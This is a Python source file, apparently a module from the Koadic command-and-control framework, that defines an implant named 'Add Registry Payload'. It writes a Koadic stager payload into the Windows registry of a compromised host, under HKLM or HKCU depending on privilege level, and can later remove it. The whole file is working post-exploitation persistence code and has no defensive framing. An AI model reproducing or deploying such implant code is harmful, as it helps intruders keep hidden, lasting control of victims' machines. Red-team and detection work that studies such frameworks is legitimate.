import core.job
import core.implant
import uuid

class RegistryJob(core.job.Job):

    def create(self):
        if self.session_id == -1:
            self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error", "")
            return False
        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
            self.script = self.script.replace(b"~HKEY~", b"Koadic.registry.HKCU")
        else:
            self.script = self.script.replace(b"~HKEY~", b"Koadic.registry.HKLM")

    def report(self, handler, data, sanitize = False):

        task = handler.get_header("Task", False)
        data = data.decode()

        if task == "AddKey":
            handler.reply(200)
            if data:
                self.shell.print_good("K0adic key added to registry.")
            else:
                self.shell.print_error("Could not add key to registry.")
            return

        if task == "DeleteKey":
            handler.reply(200)
            if "The operation completed successfully." in data:
                self.shell.print_good("Key was removed.")
            else:
                self.shell.print_error("Key could not be removed.")
            return

        if data == "Complete":
            super(RegistryJob, self).report(handler, data)

        handler.reply(200)

    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        # self.shell.print_plain(self.data)
        pass

class RegistryImplant(core.implant.Implant):

    NAME = "Add Registry Payload"
    DESCRIPTION = "Adds a Koadic stager payload in the registry."
    AUTHORS = ["TheNaterz"]

    def load(self):
        self.options.register("PAYLOAD", "", "payload to stage")
        self.options.register("CMD", "", "command", hidden=True)
        self.options.register("CLEANUP", "false", "will remove the registry key", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)

    def job(self):
        return RegistryJob

    def run(self):

        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("Payload %s not found." % id)
            return

        self.options.set("CMD", payload)
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/persist/registry.js", self.options)

        self.dispatch(payloads, self.job)
